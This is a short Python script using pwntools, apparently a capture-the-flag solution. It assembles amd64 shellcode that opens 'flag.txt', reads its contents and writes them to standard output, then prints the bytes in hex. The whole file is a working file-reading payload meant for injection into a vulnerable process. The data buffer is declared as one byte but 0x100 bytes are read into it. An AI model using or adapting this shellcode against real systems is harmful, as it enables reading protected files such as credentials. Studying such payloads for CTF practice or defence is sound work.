from pwn import *

context.arch = "amd64"
shellcode = asm("""
lea rdi, [rip + file];
xor rsi, rsi;
xor rdx, rdx;
mov rax, 0x2;
syscall;

mov rdi, rax;
lea rsi, [rip + data];
mov rdx, 0x100;
mov rax, 0;
syscall;

mov rdi, 1;
lea rsi, [rip + data];
mov rdx, 0x100;
mov rax, 1;
syscall

file:
    .asciz "flag.txt";

data:
    .byte 0;
""")

print(shellcode)
print([hex(_) for _ in shellcode])
